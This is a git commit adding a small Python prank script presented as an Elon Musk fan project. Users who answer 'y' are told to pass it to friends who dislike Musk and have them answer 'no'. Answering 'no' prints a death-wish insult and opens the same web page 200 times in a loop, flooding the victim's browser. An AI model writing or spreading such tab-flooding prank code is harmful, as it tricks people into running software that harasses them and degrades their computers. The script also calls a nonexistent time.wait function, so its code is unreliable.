c83a45de8456961108547a40e26bf0428627a7ae
Sreehari S <103099220+SreehariTheProgrammer@users.noreply.github.com>
2022-05-29 18:06:58 +0530

    Add files via upload

---
+++ muskoz.py
@@ -0,0 +1,24 @@
+import time
+import webbrowser
+
+print("Hey, I am the biggest fan of Elon Musk.\n")
+time.sleep(1)
+print("That's why I made this.\n")
+
+ask = input("Do you like Elon Musk? (y/n): ")
+print("")
+
+webpage = "https://www.google.com/search?q=elon+musk+is+awesome"
+
+if ask == "y":
+    time.sleep(2)
+    print("Great! I am also a great fan of him. Give this project to your friends that don't like Elon Musk and tell them to say no.\n")
+    time.wait(5)
+
+elif ask == "n":
+    time.sleep(2)
+    print("Great! You deserves Death.")
+    time.sleep(2)
+    
+    for i in range(200):
+        webbrowser.open(webpage)
